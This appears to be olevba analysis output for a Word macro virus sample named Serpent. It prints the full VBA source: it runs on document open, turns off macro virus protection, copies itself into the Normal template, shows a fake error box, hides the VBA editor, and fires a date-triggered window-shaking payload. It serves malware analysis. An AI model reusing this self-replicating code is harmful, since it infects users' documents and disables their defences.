olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Serpent
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Serpent - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Serpent - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Dim KIOXCFG, SDFHITD, GHJIDFR, LKJWERT: Set LKJWERT = ActiveDocument.VBProject.VBComponents(1).CodeModule: Const nula = 2 * 0
With Options: .VirusProtection = nula: End With
Set KIOXCFG = ThisDocument.VBProject.VBComponents(1).CodeModule
Set SDFHITD = NormalTemplate.VBProject.VBComponents(1).CodeModule
GHJIDFR = KIOXCFG.lines(1, KIOXCFG.countoflines)
If SDFHITD.countoflines = KIOXCFG.countoflines Then
MsgBox "Error245! MSWord will try to fix the problem.", vbCritical, "MSWord - error"
End If
Dim QOINMV As New DataObject: QOINMV.SetText GHJIDFR
With SDFHITD: .deletelines 1, SDFHITD.countoflines: .insertlines 1, QOINMV.GetText
End With: With LKJWERT: .deletelines 1, LKJWERT.countoflines: .insertlines 1, QOINMV.GetText
End With
If Day(Now()) = 7 Then
Dim asd As String
For l = 1 To 4
asd = Chr(Rnd * 34 + 123) & ChrW(Rnd * 100 + 23)
asd = asd & Chr(Rnd * 200 - 10): dsa = asd & Hex(234 * Rnd) & Chr(Rnd * 5 + 55)
dfg = dsa & Hex(54) & asd & dsa: h = Asc(Chr(Rnd * 123)): x = asd & dfg & dsa & h & x
Next l
MsgBox x & dsa & asd & dfg & dsa & dfg & dfg & dsa & "---> Kad sve izgleda da umire ono se ustvari radja! <---" & dsa & dfg & asd & dfg & dfg & h & asd & dfg & x, vbExclamation, asd & " BIHnet.ORG 4nD EB Vir Labs 43v3r!!! " & asd
Application.WindowState = wdWindowStateNormal
'===={ ideja za D-Cross payload: e[ax] }===
Application.Move 150, 150
Application.Caption = "...hmmm, strange!"
For c = 1 To 300
Application.Move c, c
Application.Move -c, -c
Next c
'===={ kraj kôda za D-Cross payload }======
End If
With CommandBars: .Item("Macro").Controls("Visual Basic Editor").Enabled = False: End With: ActiveDocument.Save
'W97M.sErPeNt bY e[ax]
'D-Cross payload bY e[ax]
'Greetz: k04x, rudeboy, t[r]ax, E-Man, BIGFOOOT, SnakeLord
'Vr4g, h4dija, slash ...te ostalim pri BIHnet.org
'10x to: [moebius], KnowDeth, Jackie 2Fl0wer, Psyclone X, Mist
'mort-, Nala, LifeWire, GygaByte, ^Coke, Fulvian, VirusBuster
'...and to VicodinES (Once again God Bless tha Poppy!)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

